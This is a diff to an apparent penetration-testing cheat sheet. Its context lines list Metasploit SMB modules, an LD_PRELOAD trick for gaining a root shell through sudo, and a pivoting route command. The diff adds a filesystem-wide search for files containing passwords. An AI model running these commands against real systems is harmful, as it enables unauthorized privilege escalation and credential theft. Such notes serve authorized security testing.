@@ -54,7 +54,7 @@
    #### 3.4 Metasploit
     exploit/windows/smb/psexec
     exploit/windows/smb/smb_relay
-
+    
 
 ### 4.SNMP 
 #### 4.1 Detection
@@ -144,6 +144,9 @@
     gcc -fPIC -shared -o shell.so shell.c -nostartfiles -w
     
     sudo LD_PRELOAD=/path/to/shell.so binary_can_be_run_as_root
+
+    ##### 6.1.4.4 Find data
+    find / -type f | xargs grep -il "password"  2>/dev/null
 
 #### 6.2 Pivoting
     From MSF Console          : route add 192.168.4.0 (subnet) 255.255.255.0(mask) 6(session)
